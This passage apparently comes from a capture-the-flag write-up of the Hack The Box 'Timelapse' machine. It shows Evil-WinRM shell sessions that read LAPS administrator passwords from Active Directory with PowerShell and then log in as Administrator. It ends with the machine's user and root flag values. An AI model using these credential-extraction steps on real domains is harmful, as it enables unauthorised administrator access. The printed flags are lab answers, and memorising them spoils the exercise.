Program Files       Windows Mail                                3/3/2022 10:01:29 PM
Program Files       Windows Media Player                        3/3/2022 10:01:29 PM
Program Files       Windows Multimedia Platform                 9/15/2018 12:19:03 AM
Program Files       windows nt                                  9/15/2018 12:28:48 AM
Program Files       Windows Photo Viewer                        3/3/2022 10:01:29 PM
Program Files       Windows Portable Devices                    9/15/2018 12:19:03 AM
Program Files       Windows Security                            9/15/2018 12:19:00 AM
Program Files       WindowsPowerShell                           9/15/2018 12:19:00 AM
Program Files (x86) Common Files                                9/15/2018 12:28:48 AM
Program Files (x86) Internet Explorer                           3/3/2022 10:01:29 PM
Program Files (x86) Microsoft.NET                               9/15/2018 12:19:00 AM
Program Files (x86) Windows Defender                            3/3/2022 10:01:29 PM
Program Files (x86) Windows Mail                                3/3/2022 10:01:29 PM
Program Files (x86) Windows Media Player                        3/3/2022 10:01:29 PM
Program Files (x86) Windows Multimedia Platform                 9/15/2018 12:19:03 AM
Program Files (x86) windows nt                                  9/15/2018 12:28:48 AM
Program Files (x86) Windows Photo Viewer                        3/3/2022 10:01:29 PM
Program Files (x86) Windows Portable Devices                    9/15/2018 12:19:03 AM
Program Files (x86) WindowsPowerShell                           9/15/2018 12:19:00 AM

*Evil-WinRM* PS C:\Program Files> cd LAPS
*Evil-WinRM* PS C:\Program Files\LAPS> dir

    Directory: C:\Program Files\LAPS

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/25/2021   9:01 AM                CSE

*Evil-WinRM* PS C:\Program Files\LAPS> cd CSE
*Evil-WinRM* PS C:\Program Files\LAPS\CSE> ls

    Directory: C:\Program Files\LAPS\CSE

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/5/2021   7:04 AM         184232 AdmPwd.dll
```

Extracted credentials from LAPS: [LAPS](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps)

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

Name ms-Mcs-AdmPwd
---- -------------
DC01 1n%91DMO+oB7g04BI3QuDqbl

┌──(maoutis㉿kali)-[~/CTF/HTB/Timelapse]
└─$ evil-winrm -u 'Administrator' -p '1n%91DMO+oB7g04BI3QuDqbl' -i 10.10.11.152 -S
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname; ipconfig
timelapse\administrator
dc01
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::244
   IPv6 Address. . . . . . . . . . . : dead:beef::a1aa:6aa7:3b3e:f286
   Link-local IPv6 Address . . . . . : fe80::a1aa:6aa7:3b3e:f286%13
   IPv4 Address. . . . . . . . . . . : 10.10.11.152
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:8587%13
                                       10.10.10.2

*Evil-WinRM* PS C:\Users> Get-Childitem -Path C:\Users -Filter *.txt -Recurse

    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/10/2022   9:53 AM             34 user.txt

    Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/10/2022   9:53 AM             34 root.txt

*Evil-WinRM* PS C:\Users> type C:\Users\TRX\Desktop\root.txt
e3bd4bdccaac9047624f5d2b0ece9955
```

![Timelapse%20823cde5795284a84b56953c6f9b4634a](../../zzz_res/attachments/Timelapse%20823cde5795284a84b56953c6f9b4634a.png)

# Trophy

![Timelapse%20823cde5795284a84b56953c6f9b4634a](../../zzz_res/attachments/Timelapse%20823cde5795284a84b56953c6f9b4634a%201.png)

>[!success]
>**User.txt**
>64233e623cda535f5a5054258fe2f9dd

>[!success]
>**Root.txt**
>e3bd4bdccaac9047624f5d2b0ece9955

